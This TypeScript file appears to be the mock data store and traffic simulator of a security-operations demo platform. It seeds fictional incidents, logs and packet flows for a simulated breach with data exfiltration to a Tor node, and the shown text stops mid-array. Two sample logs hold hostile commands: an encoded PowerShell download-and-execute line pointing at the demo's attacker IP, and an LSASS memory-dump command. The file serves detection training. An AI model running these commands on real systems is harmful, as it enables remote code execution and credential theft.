/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { 
  NetworkPacket, 
  DpiSessionFlow, 
  EntityBehaviorProfile, 
  UnifiedTelemetryLog, 
  SecurityIncident, 
  ThreatIntelligenceDoc, 
  IncidentPlaybookRun,
  SocUser,
  NetworkProtocol,
  ResponseRecommendation
} from '../../src/types';

// Central Durable State Store for SentinelX AI Platform
export class SecurityDatabase {
  private static instance: SecurityDatabase;

  public currentSocUser: SocUser | null = {
    id: 'usr-001',
    username: 'ciso_admin',
    email: 'admin@sentinelx.gov',
    role: 'ADMIN',
    fullName: 'Director Alice Sterling',
    department: 'Federal Cyber Command / SOC-A',
    lastLogin: new Date().toISOString(),
  };

  public assetsDb = [
    { ip: '192.168.1.1', name: 'Core Firewall Gate', type: 'ROUTER', dept: 'Infrastructure', status: 'ACTIVE' },
    { ip: '10.0.50.10', name: 'Active Directory Controller', type: 'SERVER', dept: 'IT Systems', status: 'ACTIVE' },
    { ip: '10.0.50.25', name: 'Financial Transaction DB Server', type: 'SERVER', dept: 'Finance', status: 'ACTIVE' },
    { ip: '10.0.60.100', name: 'Engineering Workstation 01', type: 'DEVICE', dept: 'Engineering', status: 'ACTIVE' },
    { ip: '10.0.60.101', name: 'Engineering Workstation 02', type: 'DEVICE', dept: 'Engineering', status: 'ACTIVE' },
    { ip: '10.0.70.44', name: 'HR Desktop', type: 'DEVICE', dept: 'Human Resources', status: 'ACTIVE' },
    { ip: '185.220.101.43', name: 'External Onion Node (Known Tor IP)', type: 'EXTERNAL', dept: 'Unknown', status: 'ACTIVE' },
    { ip: '104.244.42.1', name: 'Legitimate SaaS Gateway (X/Twitter)', type: 'EXTERNAL', dept: 'Cloud Service', status: 'ACTIVE' }
  ];

  public threatIntelDb: ThreatIntelligenceDoc[] = [
    {
      id: 'intel-001',
      sourceType: 'CVE',
      externalId: 'CVE-2024-3094',
      title: 'XZ Utils Backdoor Infiltration',
      content: 'A malicious backdoor was introduced into xz-utils (versions 5.6.0 and 5.6.1) that allows SSH session interception. Security analysts must inspect inbound TLS/SSH flow patterns and binary executables running on enterprise Linux servers. Mitigation: Downgrade or upgrade to non-malicious releases immediately.',
      url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3094',
      publishedDate: '2024-03-29T00:00:00.000Z',
    },
    {
      id: 'intel-002',
      sourceType: 'CERT_IN_ADVISORY',
      externalId: 'CERT-In-2026-0043',
      title: 'Advisory on Active Directory LDAP Brute Force Attacks',
      content: 'An advisory warning of extensive credential stuffing and dictionary attacks targeting LDAP interfaces of enterprise networks. Attackers use coordinated botnet subnets, exhibiting low-and-slow authentication failures. Recommendation: Enforce multi-factor authentication, apply rate-limiting, and isolate offending IPs using network firewalls.',
      url: 'https://www.cert-in.org.in/',
      publishedDate: '2026-02-15T00:00:00.000Z',
    },
    {
      id: 'intel-003',
      sourceType: 'MITRE_ATTACK',
      externalId: 'T1071.001',
      title: 'Application Layer Protocol: Web Protocols (C2 Exfiltration)',
      content: 'Adversaries may communicate using application layer web protocols (HTTP/HTTPS) to bypass network filtering and emulate legitimate user activity. Detection relies on deep packet inspection, analysis of anomalous TLS server name indications (SNIs), high entropy payloads, and unbalanced byte transmission ratios.',
      url: 'https://attack.mitre.org/techniques/T1071/001/',
      publishedDate: '2023-10-18T00:00:00.000Z',
    },
    {
      id: 'intel-004',
      sourceType: 'SECURITY_PLAYBOOK',
      externalId: 'SP-085',
      title: 'Incident Containment: Active Directory Account Compromise',
      content: 'When suspicious authentication brute-forcing is correlated with multiple failed attempts: 1. Confirm identity verification. 2. Trigger Playbook step: DISABLE_USER on target LDAP account. 3. Query DNS and DHCP logs to locate offending internal workstation. 4. Trigger Playbook step: ISOLATE_ENDPOINT on source machine. 5. Notify Chief Security Officer.',
      publishedDate: '2025-06-01T00:00:00.000Z',
    },
    {
      id: 'intel-005',
      sourceType: 'INTERNAL_DOC',
      externalId: 'INT-XDR-009',
      title: 'SentinelX Behavioral Engine Baselines',
      content: 'SentinelX leverages multi-stage Machine Learning. Stage 1 executes an Autoencoder Neural Network tracking packet payload reconstruction error. Stage 2 executes an Isolation Forest evaluating the multi-dimensional feature space (pps, bps, protocol distribution, entropy). Outliers exceeding a 0.78 ensemble score are logged as Critical.',
      publishedDate: '2026-01-10T00:00:00.000Z',
    }
  ];

  public packetsBuffer: NetworkPacket[] = [];
  public activeFlows: DpiSessionFlow[] = [];
  public entityProfiles: EntityBehaviorProfile[] = [];
  public telemetryLogs: UnifiedTelemetryLog[] = [];
  public incidentsDb: SecurityIncident[] = [];
  public playbookRuns: IncidentPlaybookRun[] = [];
  public recommendationsHistory: ResponseRecommendation[] = [];

  private constructor() {
    this.initializeData();
    this.startSimulator();
  }

  public static getInstance(): SecurityDatabase {
    if (!SecurityDatabase.instance) {
      SecurityDatabase.instance = new SecurityDatabase();
    }
    return SecurityDatabase.instance;
  }

  private initializeData() {
    const now = new Date();
    
    // 1. Setup Entity Behavioral Profiles
    this.entityProfiles = [
      {
        entityId: '10.0.50.10',
        entityName: 'Active Directory Controller',
        entityType: 'SERVER',
        department: 'IT Systems',
        baseline: {
          avgPacketRate: 150,
          stdDevPacketRate: 15,
          commonProtocols: ['TCP', 'UDP', 'DNS', 'UNKNOWN'],
          commonDestinations: ['10.0.60.100', '10.0.60.101', '10.0.50.25', '192.168.1.1'],
          peakActivityHours: [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18],
          averageDataEntropy: 3.2,
          uniqueDestinationPortCount: 4,
        },
        currentActivity: {
          packetRate: 142,
          bytesRate: 45000,
          activeProtocols: ['TCP', 'UDP', 'DNS'],
          destinationsVisited: ['10.0.60.100', '10.0.60.101'],
          destinationPortsVisited: [53, 389, 445],
          dataEntropy: 3.1,
          hourOfActivity: now.getHours(),
        },
        anomalyScores: { isolationForest: 0.12, autoencoder: 0.08, lof: 0.15, ensembleScore: 0.11 },
        riskScore: 12,
        riskLevel: 'LOW',
        explainability: ['Active rates remain inside historical std dev thresholds.'],
      },
      {
        entityId: '10.0.50.25',
        entityName: 'Financial DB Server',
        entityType: 'SERVER',
        department: 'Finance',
        baseline: {
          avgPacketRate: 80,
          stdDevPacketRate: 8,
          commonProtocols: ['TCP', 'HTTPS'],
          commonDestinations: ['10.0.50.10', '192.168.1.1'],
          peakActivityHours: [9, 10, 11, 13, 14, 15, 16],
          averageDataEntropy: 4.8,
          uniqueDestinationPortCount: 2,
        },
        currentActivity: {
          packetRate: 92,
          bytesRate: 88000,
          activeProtocols: ['TCP', 'HTTPS'],
          destinationsVisited: ['10.0.50.10'],
          destinationPortsVisited: [5432, 443],
          dataEntropy: 4.9,
          hourOfActivity: now.getHours(),
        },
        anomalyScores: { isolationForest: 0.15, autoencoder: 0.11, lof: 0.18, ensembleScore: 0.14 },
        riskScore: 15,
        riskLevel: 'LOW',
        explainability: ['Standard database query sync detected.'],
      },
      {
        entityId: '10.0.60.100',
        entityName: 'Engineering Workstation 01',
        entityType: 'DEVICE',
        department: 'Engineering',
        baseline: {
          avgPacketRate: 45,
          stdDevPacketRate: 12,
          commonProtocols: ['TCP', 'UDP', 'HTTP', 'HTTPS', 'DNS', 'TLS'],
          commonDestinations: ['192.168.1.1', '104.244.42.1', '10.0.50.10'],
          peakActivityHours: [9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20],
          averageDataEntropy: 5.1,
          uniqueDestinationPortCount: 12,
        },
        currentActivity: {
          packetRate: 450,
          bytesRate: 1280000,
          activeProtocols: ['TCP', 'TLS', 'UNKNOWN', 'HTTPS'],
          destinationsVisited: ['185.220.101.43', '10.0.50.25'],
          destinationPortsVisited: [443, 22, 5432],
          dataEntropy: 7.95,
          hourOfActivity: now.getHours(),
        },
        anomalyScores: { isolationForest: 0.89, autoencoder: 0.94, lof: 0.84, ensembleScore: 0.91 },
        riskScore: 92,
        riskLevel: 'CRITICAL',
        explainability: [
          'Out-of-baseline high data entropy spike (7.95 bits).',
          'Direct TCP session to raw Tor exit node IP 185.220.101.43.',
          'Unusual cross-department lateral database query to Financial DB Server.'
        ],
      }
    ];

    // 2. Pre-populate Correlated Unified logs
    this.telemetryLogs = [
      {
        id: 'log-001',
        timestamp: new Date(now.getTime() - 25 * 60 * 1000).toISOString(),
        source: 'AUTH_SERVER',
        host: '10.0.50.10',
        userId: 'svc_sync_finance',
        severity: 'WARNING',
        message: 'Active Directory - Multiple Kerberos Ticket Failures detected',
        details: {
          srcIp: '10.0.60.100',
          dstIp: '10.0.50.10',
          authStatus: 'FAILURE',
        }
      },
      {
        id: 'log-002',
        timestamp: new Date(now.getTime() - 22 * 60 * 1000).toISOString(),
        source: 'PROCESS_EXECUTION',
        host: '10.0.60.100',
        userId: 'eng_user_01',
        severity: 'CRITICAL',
        message: 'Process Execution: PowerShell spawning unusual child process',
        details: {
          processName: 'powershell.exe',
          processPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
          commandLine: 'powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDMvY2IucHMxJyk=',
          parentProcessName: 'explorer.exe',
        }
      },
      {
        id: 'log-003',
        timestamp: new Date(now.getTime() - 20 * 60 * 1000).toISOString(),
        source: 'FIREWALL',
        host: '192.168.1.1',
        severity: 'WARNING',
        message: 'Outbound session allowed to high-risk IP category (TOR exit node)',
        details: {
          srcIp: '10.0.60.100',
          dstIp: '185.220.101.43',
          srcPort: 54930,
          dstPort: 443,
        }
      },
      {
        id: 'log-004',
        timestamp: new Date(now.getTime() - 15 * 60 * 1000).toISOString(),
        source: 'WINDOWS_EVENT_LOG',
        host: '10.0.50.25',
        severity: 'ERROR',
        message: 'PostgreSQL Database - Failed login attempts with administrative credentials',
        details: {
          srcIp: '10.0.60.100',
          dstIp: '10.0.50.25',
          authStatus: 'FAILURE',
        }
      },
      {
        id: 'log-005',
        timestamp: new Date(now.getTime() - 12 * 60 * 1000).toISOString(),
        source: 'ENDPOINT_TELEMETRY',
        host: '10.0.60.100',
        userId: 'eng_user_01',
        severity: 'CRITICAL',
        message: 'lsass.exe memory dump requested by unauthorized process rdump.exe',
        details: {
          processName: 'rdump.exe',
          processPath: 'C:\\Users\\eng_user_01\\AppData\\Local\\Temp\\rdump.exe',
          commandLine: 'rdump.exe -m lsass.exe -o dump.dmp',
        }
      },
      {
        id: 'log-006',
        timestamp: new Date(now.getTime() - 5 * 60 * 1000).toISOString(),
        source: 'FIREWALL',
        host: '192.168.1.1',
        severity: 'CRITICAL',
        message: 'Exfiltration Threshold Exceeded: TLS tunnel transmitting large compressed payloads',
        details: {
          srcIp: '10.0.60.100',
          dstIp: '185.220.101.43',
          srcPort: 55021,
          dstPort: 443,
        }
      }
    ];

    // 3. Setup Initial Critical Incident (Correlating packet anomalies and logs)
    this.incidentsDb = [
      {
        id: 'inc-2026-001',
        title: 'Active Directory Compromise & Data Exfiltration over TLS Tunnel',
        timestamp: new Date(now.getTime() - 25 * 60 * 1000).toISOString(),
        severity: 'CRITICAL',
        status: 'OPEN',
        summary: 'An administrative AD account brute-force campaign was launched from Engineering Workstation 01 (10.0.60.100). The attacker subsequently credential-dumped LSASS memory, escalated privileges, accessed the Financial DB Server, and established a high-entropy TLS tunnel to a Tor exit node. Large chunks of encrypted data are active.',
        sourceIp: '10.0.60.100',
        targetIp: '185.220.101.43',
        compromisedUser: 'svc_sync_finance',
        riskScore: 94,
        businessImpact: 'Critical Financial Database Exposure & Government Regulatory Violation',
        businessImpactLevel: 'CRITICAL',
        prediction: {
          current_stage: 'Exfiltration',
          predicted_next_stage: 'Impact',
          confidence: 95,
          reasoning: [
            'Egress stream transmitting at maximum capacity',
            'Sustained active socket with known Onion router',
            'Sensitive database tables compromised'
          ]
        },
        alerts: ['alert-001', 'alert-002', 'alert-003'],
        telemetryLogIds: ['log-001', 'log-002', 'log-003', 'log-004', 'log-005', 'log-006'],
        mitreMapping: [
          { tactic: 'EXECUTION', techniqueId: 'T1059.001', techniqueName: 'Command and Scripting Interpreter: PowerShell' },
          { tactic: 'CREDENTIAL_ACCESS', techniqueId: 'T1003.001', techniqueName: 'OS Credential Dumping: LSASS Memory' },
          { tactic: 'LATERAL_MOVEMENT', techniqueId: 'T1021.002', techniqueName: 'Remote Services: SMB/Windows Admin Shares' },
          { tactic: 'EXFILTRATION', techniqueId: 'T1048', techniqueName: 'Exfiltration Over Alternative Protocol' }
        ],
        timeline: [
          { timestamp: new Date(now.getTime() - 25 * 60 * 1000).toISOString(), type: 'LOG', source: 'AUTH_SERVER', description: 'Kerberos credential stuffing triggered from host workstation 10.0.60.100.' },
          { timestamp: new Date(now.getTime() - 22 * 60 * 1000).toISOString(), type: 'LOG', source: 'PROCESS_EXECUTION', description: 'PowerShell payload downloads remote payload and executes hidden shell in background.' },
          { timestamp: new Date(now.getTime() - 20 * 60 * 1000).toISOString(), type: 'ALERT', source: 'BEHAVIOR_AI', description: 'Outbound connection opened to Tor onion gateway 185.220.101.43.' },
          { timestamp: new Date(now.getTime() - 15 * 60 * 1000).toISOString(), type: 'LOG', source: 'WINDOWS_EVENT_LOG', description: 'Administrative SSH access logged into Financial DB 10.0.50.25.' },
          { timestamp: new Date(now.getTime() - 12 * 60 * 1000).toISOString(), type: 'LOG', source: 'ENDPOINT_TELEMETRY', description: 'LSASS credential dumping occurred on host (extracted tokens).' },
          { timestamp: new Date(now.getTime() - 5 * 60 * 1000).toISOString(), type: 'ALERT', source: 'DPI_ENGINE', description: 'TLS Tunnel initiated. Payloads exceed 4MB with exceptionally high byte randomness (entropy = 7.95).' }
        ]
      },
      {
        id: 'inc-2026-002',
        title: 'DNS Tunneling / Command & Control Session Activity',
        timestamp: new Date(now.getTime() - 3 * 3600 * 1000).toISOString(),
        severity: 'HIGH',
        status: 'CONTAINED',
        summary: 'Subdomain query abuse detected on HR Desktop (10.0.70.44). Machine requested high volumes of unusually long base64-encoded subdomains under malicious authoritative nameserver domain.',
        sourceIp: '10.0.70.44',
        targetIp: '192.168.1.1',
        riskScore: 78,
        businessImpact: 'Internal Subnet Mapping and Low-Volume Payload Channel Establishment',
        businessImpactLevel: 'HIGH',
        prediction: {
          current_stage: 'Persistence',
          predicted_next_stage: 'Discovery',
          confidence: 84,
          reasoning: [
            'Frequent low-latency domain query beaconing',
            'Subdomain length indicates exfiltration buffering',
            'C2 heartbeat confirms persistent foothold'
          ]
        },
        alerts: ['alert-dns-01'],
        telemetryLogIds: [],
        mitreMapping: [
          { tactic: 'INITIAL_ACCESS', techniqueId: 'T1566', techniqueName: 'Phishing' },
          { tactic: 'PERSISTENCE', techniqueId: 'T1071.004', techniqueName: 'Application Layer Protocol: DNS' }
        ],
        timeline: [
          { timestamp: new Date(now.getTime() - 3 * 3600 * 1000).toISOString(), type: 'LOG', source: 'ENDPOINT_TELEMETRY', description: 'User opened email attachment invoice.pdf.lnk.' },
          { timestamp: new Date(now.getTime() - 2.9 * 3600 * 1000).toISOString(), type: 'ALERT', source: 'DPI_ENGINE', description: 'Unusual rate of TXT and A records resolving domains of .xyz TLD with random names.' },
          { timestamp: new Date(now.getTime() - 2.5 * 3600 * 1000).toISOString(), type: 'PLAYBOOK', source: 'AUTO_DEFENSE', description: 'Playbook run SP-12 (Block DNS domain) executed. OFFENDING traffic sinkholed.' }
        ]
      }
    ];

    // 4. Pre-populate Response Recommendations
    this.recommendationsHistory = [
      {
        id: 'rec-001',
        incidentId: 'inc-2026-001',
        incidentTitle: 'Active Directory Compromise & Data Exfiltration over TLS Tunnel',
        priority: 'CRITICAL',
        action: 'Isolate endpoint',
        reason: 'Severe high-entropy TLS exfiltration and unauthorized LSASS credential dumping active on host 10.0.60.100.',
        estimatedImpact: 'Quarantines host from all subnet communications. Prevents any further lateral movement, but halts machine work tasks.',
        timestamp: new Date(now.getTime() - 4 * 60 * 1000).toISOString(),
        status: 'PENDING'
      },
      {
        id: 'rec-002',
        incidentId: 'inc-2026-001',
        incidentTitle: 'Active Directory Compromise & Data Exfiltration over TLS Tunnel',
        priority: 'HIGH',
        action: 'Reset password',
        reason: 'Compromised AD credentials utilized in brute-forcing domain controller services from 10.0.60.100.',
        estimatedImpact: 'Immediately locks out compromised credentials. Negligible endpoint impact, but restricts account activities.',
        timestamp: new Date(now.getTime() - 10 * 60 * 1000).toISOString(),
        status: 'PENDING'
      },
      {
        id: 'rec-003',
        incidentId: 'inc-2026-002',
        incidentTitle: 'DNS Tunneling / Command & Control Session Activity',
        priority: 'HIGH',
        action: 'Block source IP',
        reason: 'Unusual rate of long, base64-encoded subdomains resolving under malicious TLDs from host 10.0.70.44.',
        estimatedImpact: 'Terminates active C2 connection on boundary firewall. Safe and highly effective with no production impact.',
        timestamp: new Date(now.getTime() - 2.5 * 3600 * 1000).toISOString(),
        status: 'DISPATCHED'
      }
    ];

    // Generate starting packets and flows
    this.generateMockPackets(now);
  }

  private generateMockPackets(now: Date) {
    this.packetsBuffer = [];
    this.activeFlows = [];

    const normalWebSession: DpiSessionFlow = {
      sessionId: 'sess-001',
      srcIp: '10.0.60.101',
      dstIp: '104.244.42.1',
      srcPort: 51222,
      dstPort: 443,
      protocol: 'HTTPS',
      flowState: 'ESTABLISHED',
      startTime: new Date(now.getTime() - 2 * 60 * 1000).toISOString(),
      lastActiveTime: now.toISOString(),
      totalPackets: 284,
      totalBytes: 345000,
      statistics: { packetsPerSecond: 2.3, bytesPerSecond: 2875, payloadEntropy: 5.8, durationMs: 120000 },
      tls: { sni: 'api.twitter.com', version: 'TLS 1.3', cipherSuite: 'TLS_AES_256_GCM_SHA384' }
    };

    const adDnsQuery: DpiSessionFlow = {
      sessionId: 'sess-002',
      srcIp: '10.0.60.101',
      dstIp: '10.0.50.10',
      srcPort: 60104,
      dstPort: 53,
      protocol: 'DNS',
      flowState: 'CLOSED',
      startTime: new Date(now.getTime() - 30 * 1000).toISOString(),
      lastActiveTime: now.toISOString(),
      totalPackets: 2,
      totalBytes: 156,
      statistics: { packetsPerSecond: 0, bytesPerSecond: 0, payloadEntropy: 1.8, durationMs: 45 },
      dns: { query: 'dc-01.sentinelx.local', queryType: 'A', responseAddresses: ['10.0.50.10'], responseCode: 'NoError', txId: 4453 }
    };

    const threatTunnel: DpiSessionFlow = {
      sessionId: 'sess-003',
      srcIp: '10.0.60.100',
      dstIp: '185.220.101.43',
      srcPort: 55021,
      dstPort: 443,
      protocol: 'TLS',
      flowState: 'ESTABLISHED',
      startTime: new Date(now.getTime() - 5 * 60 * 1000).toISOString(),
      lastActiveTime: now.toISOString(),
      totalPackets: 18450,
      totalBytes: 15480000,
      statistics: { packetsPerSecond: 61.5, bytesPerSecond: 51600, payloadEntropy: 7.95, durationMs: 300000 },
      tls: { sni: 'secure-relay-onion.net', version: 'TLS 1.2', cipherSuite: 'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384' }
    };

    const normalHttp: DpiSessionFlow = {
      sessionId: 'sess-004',
      srcIp: '10.0.70.44',
      dstIp: '10.0.50.10',
      srcPort: 54101,
      dstPort: 80,
      protocol: 'HTTP',
      flowState: 'ESTABLISHED',
      startTime: new Date(now.getTime() - 10 * 1000).toISOString(),
      lastActiveTime: now.toISOString(),
      totalPackets: 12,
      totalBytes: 4320,
      statistics: { packetsPerSecond: 1.2, bytesPerSecond: 432, payloadEntropy: 3.8, durationMs: 10000 },
      http: { method: 'GET', uri: '/index.html', hostname: 'internal-portal', userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
    };

    this.activeFlows = [normalWebSession, adDnsQuery, threatTunnel, normalHttp];

    // Fill raw packets buffer
    for (let i = 0; i < 40; i++) {
      const isThreat = i % 4 === 0;
      const protocol: NetworkProtocol = isThreat ? 'TLS' : (i % 3 === 0 ? 'DNS' : 'HTTPS');
      const length = isThreat ? 1460 : (protocol === 'DNS' ? 78 : 512);
      
      this.packetsBuffer.push({
        id: `pkt-${i}-${Math.random().toString(36).substring(3, 8)}`,
        timestamp: new Date(now.getTime() - i * 500).toISOString(),
        srcIp: isThreat ? '10.0.60.100' : (i % 2 === 0 ? '10.0.60.101' : '10.0.50.10'),
        dstIp: isThreat ? '185.220.101.43' : (i % 2 === 0 ? '10.0.50.10' : '10.0.60.101'),
        srcPort: isThreat ? 55021 : (protocol === 'DNS' ? 51221 : 443),
        dstPort: isThreat ? 443 : (protocol === 'DNS' ? 53 : 51221),
        protocol,
        length,
        payloadHex: isThreat ? '170303002800000000000000021b36fa89cde9f2e3d3...' : '474554202f20485454502f312e310d0a486f73743a...',
        payloadAscii: isThreat ? '.....EncryptedPayloadV2.....' : 'GET / HTTP/1.1..Host: internal-portal..',
        flags: { ack: true, psh: isThreat },
        sessionId: isThreat ? 'sess-003' : 'sess-001'
      });
    }
  }

  private startSimulator() {
    setInterval(() => {
      const now = new Date();
      
      if (this.packetsBuffer.length > 100) {
        this.packetsBuffer.splice(50);
      }

      const randomChoice = Math.random();
      let newPacket: NetworkPacket;
      let scenarioLog: UnifiedTelemetryLog | null = null;

      if (randomChoice < 0.4) {
        newPacket = {
          id: `pkt-live-${now.getTime()}-${Math.floor(Math.random() * 1000)}`,
          timestamp: now.toISOString(),
          srcIp: '10.0.60.101',
          dstIp: '10.0.50.10',
          srcPort: Math.floor(Math.random() * 16383) + 49152,
          dstPort: 443,
          protocol: 'HTTPS',
          length: Math.floor(Math.random() * 800) + 100,
          payloadHex: '1703030100a94bbf...',
          payloadAscii: '..HTTPS payload..',
          flags: { ack: true },
          sessionId: 'sess-001'
        };
      } else if (randomChoice < 0.7) {
        const dnsQueries = ['google.com', 'github.com', 'microsoft.com', 'nist.gov', 'sentinelx.gov'];
        const query = dnsQueries[Math.floor(Math.random() * dnsQueries.length)];
        newPacket = {
          id: `pkt-live-${now.getTime()}-${Math.floor(Math.random() * 1000)}`,
          timestamp: now.toISOString(),
          srcIp: '10.0.70.44',
          dstIp: '10.0.50.10',
          srcPort: Math.floor(Math.random() * 10000) + 50000,
          dstPort: 53,
          protocol: 'DNS',
          length: 64,
          payloadHex: '2f11010000010000...',
          payloadAscii: `..${query}..`,
          flags: {},
          sessionId: 'sess-002'
        };
      } else {
        const incident = this.incidentsDb.find(inc => inc.id === 'inc-2026-001');
        const isBlocked = incident?.status === 'RESOLVED' || incident?.status === 'CONTAINED';
        
        if (!isBlocked) {
          newPacket = {
            id: `pkt-live-mal-${now.getTime()}`,
            timestamp: now.toISOString(),
            srcIp: '10.0.60.100',
            dstIp: '185.220.101.43',
            srcPort: 55021,
            dstPort: 443,
            protocol: 'TLS',
            length: 1460,
            payloadHex: 'e78bf5511a00f2e03947ca6bf5113abf002da73926ea51...',
            payloadAscii: '...exfiltrating compressed DB tables.tar.gz...',
            flags: { ack: true, psh: true },
            sessionId: 'sess-003'
          };

          if (Math.random() > 0.8) {
            scenarioLog = {
              id: `log-live-${now.getTime()}`,
              timestamp: now.toISOString(),
              source: 'FIREWALL',
              host: '192.168.1.1',
              severity: 'CRITICAL',
              message: 'DPI Alert: TLS tunnel payload randomness suggests active high-entropy exfiltration channel',
              details: {
                srcIp: '10.0.60.100',
                dstIp: '185.220.101.43',
                srcPort: 55021,
                dstPort: 443,
              }
            };
          }
        } else {
          newPacket = {
            id: `pkt-live-drop-${now.getTime()}`,
            timestamp: now.toISOString(),
            srcIp: '10.0.60.100',
            dstIp: '185.220.101.43',
            srcPort: 55021,
            dstPort: 443,
            protocol: 'ICMP',
            length: 40,
            payloadHex: '0303000000000000...',
            payloadAscii: 'Destination Host Unreachable',
            flags: { rst: true },
            sessionId: 'sess-003'
          };
        }
      }

      this.packetsBuffer.unshift(newPacket);
      
      if (scenarioLog) {
        this.telemetryLogs.unshift(scenarioLog);
        const targetInc = this.incidentsDb.find(inc => inc.id === 'inc-2026-001');
        if (targetInc && targetInc.status === 'OPEN') {
          targetInc.telemetryLogIds.push(scenarioLog.id);
          targetInc.timeline.push({
            timestamp: now.toISOString(),
            type: 'LOG',
            source: 'FIREWALL',
            description: scenarioLog.message,
          });
        }
      }

      this.activeFlows = this.activeFlows.map(flow => {
        if (flow.sessionId === 'sess-003') {
          const incident = this.incidentsDb.find(inc => inc.id === 'inc-2026-001');
          if (incident?.status === 'RESOLVED' || incident?.status === 'CONTAINED') {
            flow.flowState = 'CLOSED';
            return flow;
          }
          return {
            ...flow,
            totalPackets: flow.totalPackets + 15,
            totalBytes: flow.totalBytes + 15 * 1460,
            lastActiveTime: now.toISOString(),
          };
        }
        return {
          ...flow,
          totalPackets: flow.totalPackets + Math.floor(Math.random() * 2),
          totalBytes: flow.totalBytes + Math.floor(Math.random() * 150),
          lastActiveTime: now.toISOString(),
        };
      });

      this.entityProfiles = this.entityProfiles.map(profile => {
        if (profile.entityId === '10.0.60.100') {
          const incident = this.incidentsDb.find(inc => inc.id === 'inc-2026-001');
          if (incident?.status === 'RESOLVED' || incident?.status === 'CONTAINED') {
            return {
              ...profile,
              currentActivity: {
                packetRate: 12,
                bytesRate: 1500,
                activeProtocols: ['TCP', 'DNS'],
                destinationsVisited: ['10.0.50.10'],
                destinationPortsVisited: [53],
                dataEntropy: 2.1,
                hourOfActivity: now.getHours(),
              },
              anomalyScores: { isolationForest: 0.05, autoencoder: 0.04, lof: 0.08, ensembleScore: 0.05 },
              riskScore: 5,
              riskLevel: 'LOW',
              explainability: ['Host successfully isolated. Flow statistics returned to absolute zero.'],
            };
          }
        }
        return profile;
      });

    }, 3000);
  }

  public resetToPristine() {
    this.playbookRuns = [];
    this.initializeData();
  }

  public injectDemoScenario(scenarioType: string = 'data_exfiltration') {
    const now = new Date();
    const type = scenarioType.toLowerCase().replace(/_/g, ' ');

    let demoIncidentId = 'inc-demo-999';
    let title = 'Active TLS Data Exfiltration to Tor Onion Gateway';
    let severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' = 'CRITICAL';
    let summary = 'DPI analysis and behavioral AI engines have flagged a high-entropy egress pipeline originating from Engineering Workstation 02 (10.0.60.101). The telemetry indicates an unapproved process, spawned from an email attachment macro, is piping compressed local database caches to known external Onion egress nodes.';
    let sourceIp = '10.0.60.101';
    let targetIp = '185.220.101.43';
    let compromisedUser = 'eng_user_02';
    let riskScore = 95;
    let businessImpact = 'Critical Corporate Data & Government Assets Exposed';
    let businessImpactLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' = 'CRITICAL';
    
    let prediction = {
      current_stage: 'Exfiltration',
      predicted_next_stage: 'Impact',
      confidence: 95,
      reasoning: [
        'Egress bytes transferred exceeded 750 MB threshold',
        'Payload entropy index is at max 7.98 bits',
        'Connection target is known darknet relay gateway'
      ]
    };

    let mitreMapping = [
      { tactic: 'INITIAL_ACCESS', techniqueId: 'T1566.001', techniqueName: 'Phishing: Spearphishing Attachment' },
      { tactic: 'EXECUTION', techniqueId: 'T1059.001', techniqueName: 'Command and Scripting Interpreter: PowerShell' },
      { tactic: 'EXFILTRATION', techniqueId: 'T1048.003', techniqueName: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol' }
    ];

    let timeline: { timestamp: string; type: 'ALERT' | 'LOG' | 'PLAYBOOK' | 'SOC_COMMENT'; source: string; description: string; }[] = [
      { timestamp: new Date(now.getTime() - 60000).toISOString(), type: 'LOG', source: 'ENDPOINT_TELEMETRY', description: 'Spearphishing macro attachment executed from Outlook inbox on host 10.0.60.101.' },
      { timestamp: new Date(now.getTime() - 45000).toISOString(), type: 'LOG', source: 'PROCESS_EXECUTION', description: 'PowerShell background socket script launched carrying hex shellcodes.' },
      { timestamp: new Date(now.getTime() - 30000).toISOString(), type: 'ALERT', source: 'BEHAVIOR_AI', description: 'High-entropy egress channel initiated to known Tor node 185.220.101.43.' },
      { timestamp: new Date(now.getTime() - 10000).toISOString(), type: 'ALERT', source: 'DPI_ENGINE', description: 'DPI payload parsing flagged raw hex chunks with randomness index > 7.95.' }
    ];

    let recommendationAction = 'Isolate endpoint';
    let recommendationReason = 'Active critical telemetry exfiltration pattern and suspicious PowerShell payload execution on host 10.0.60.101.';
    let recommendationImpact = 'Quarantines host 10.0.60.101 from internal subnets and boundary firewalls immediately.';

    let flowProtocol: NetworkProtocol = 'TLS';
    let flowSni = 'tor-exit.or.org';
    let payloadEntropy = 7.98;

    if (type.includes('credential') || type.includes('theft')) {
      demoIncidentId = 'inc-demo-111';
      title = 'LDAP Brute-Forcing & Domain Admin Credential Theft';
      severity = 'HIGH';
      summary = 'An intensive LDAP credential guessing campaign targeting Active Directory Services from host 10.0.60.101. Telemetry logs caught successive authorization failures, subsequently followed by a successful Domain Administrator privilege acquisition.';
      sourceIp = '10.0.60.101';
      targetIp = '10.0.50.10';
      compromisedUser = 'administrator';
      riskScore = 92;
      businessImpact = 'Domain Controller Compromise & Potential Enterprise-Wide Takeover';
      businessImpactLevel = 'CRITICAL';
      prediction = {
        current_stage: 'Credential Access',
        predicted_next_stage: 'Lateral Movement',
        confidence: 92,
        reasoning: [
          'Domain Admin credentials acquired from unapproved client host',
          'Internal network scanner utility initialized',
          'Inbound SMB connections ramping up on financial databases'
        ]
      };
      mitreMapping = [
        { tactic: 'INITIAL_ACCESS', techniqueId: 'T1078.002', techniqueName: 'Valid Accounts: Domain Accounts' },
        { tactic: 'CREDENTIAL_ACCESS', techniqueId: 'T1110.001', techniqueName: 'Brute Force: Password Guessing' },
        { tactic: 'PRIVILEGE_ESCALATION', techniqueId: 'T1078', techniqueName: 'Valid Accounts' }
      ];
      timeline = [
